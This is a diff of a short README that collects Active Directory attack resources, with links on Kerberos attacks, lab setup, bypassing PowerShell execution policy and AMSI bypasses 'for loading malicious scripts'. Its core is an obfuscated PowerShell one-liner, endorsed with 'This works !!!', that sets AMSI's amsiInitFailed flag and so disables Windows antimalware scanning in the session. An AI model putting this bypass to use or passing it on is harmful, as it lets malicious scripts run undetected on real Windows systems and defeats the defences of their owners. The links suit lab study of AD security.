@@ -1,21 +1,22 @@
 # AD-Security-Resources
 
+Bypass Execution Policy : 
+https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/
 
-<H2>Huge list of AD security resources available below :</H2>
+Huge list of AD security resources available below :
   https://adsecurity.org/
   https://www.harmj0y.net/
   https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html
   https://beta.hackndo.com/
 
 
-<H2> Setting up active directory lab : <H2> https://github.com/outflanknl/Invoke-ADLabDeployer 
+Setting up active directory lab : <H2> https://github.com/outflanknl/Invoke-ADLabDeployer 
 
+Bypassing Powershell execution policy issues : </H2>
 
-<H2> Bypassing Powershell execution policy issues : </H2>
-
-<h3>Github links - AMSI Bypass for loading malicious scripts: <h3> 
+Github links - AMSI Bypass for loading malicious scripts:
   <p>  https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell </p>
-<h3> Something that works quickly </h3>
+  Something that works quickly 
   <p>   sETItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE') ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL)."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ))."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),("{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} ) </p>
 
 This works !!!
